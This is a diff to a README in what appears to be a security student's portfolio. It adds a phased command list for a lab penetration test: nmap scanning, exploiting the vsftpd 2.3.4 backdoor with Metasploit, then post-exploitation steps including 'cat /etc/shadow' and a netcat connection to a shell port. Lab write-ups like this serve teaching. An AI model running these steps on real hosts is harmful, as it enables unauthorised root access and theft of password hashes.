@@ -16,12 +16,38 @@ Performed a full penetration test lifecycle: reconnaissance, scanning, vulnerabi
 - ✅ Exploitation via Metasploit Framework
 - ✅ Brute force attacks with Hydra
 
-**nmap version scan — identifying vsftpd 2.3.4**
-<br><img width="611" height="167" alt="image" src="https://github.com/user-attachments/assets/d51c3811-2c13-4a6e-8a3d-8f0e622d4b43" />
+Commands:
+>Phase 1 — Reconnaissance
+- sudo netdiscover -r $HOST -i eth0
+- sudo nmap $HOST                          # basic scan
+- sudo nmap -T5 -sV $HOST                  # version detection
+- sudo nmap --script=vuln -p 21 $HOST      # vulnerability confirmation
 
-**Metasploit — root shell obtained**
-<br><img width="531" height="117" alt="image" src="https://github.com/user-attachments/assets/a8a17a0f-5d3e-42d8-8ba0-347b4e12013e" />
-<br><img width="401" height="215" alt="image" src="https://github.com/user-attachments/assets/33cb446c-2d39-4a2c-9f3f-dcbf43f040d4" />
+>Phase 2 — Exploitation
+- msfconsole
+- msf6 > search vsftpd
+- msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+- msf6 > set RHOSTS $HOST
+- msf6 > run
+
+>Phase 3 — Post-Exploitation
+- whoami
+- hostname
+- pwd
+- ls /
+- cat /etc/shadow
+- nc $HOST 1524                            
+
+**nmap version scan — identifying vsftpd 2.3.4**
+<br><img width="610" height="165" alt="image" src="https://github.com/user-attachments/assets/d3ff4093-4ccb-429f-9ce7-41f16b4d0dc2" />
+
+**vulnerability Confirmation**
+<br><img width="418" height="134" alt="image" src="https://github.com/user-attachments/assets/964b4ae0-2f73-4d9a-a06e-9bbf77c113fc" />
+
+**metasploit — root shell obtained**
+<br><img width="550" height="165" alt="image" src="https://github.com/user-attachments/assets/5338c658-d205-43ff-83bb-1a3d9842fba4" />
+<br><img width="611" height="222" alt="image" src="https://github.com/user-attachments/assets/5a2bb5d0-0543-47ba-8c73-fb09a3521b5d" />
+
 
 
 > 📄 **[Download Full Lab Report (PDF)](https://github.com/jaalso/cybersecurity-portfolio/raw/main/Pentest_Lab_Writeup_protected.pdf)**
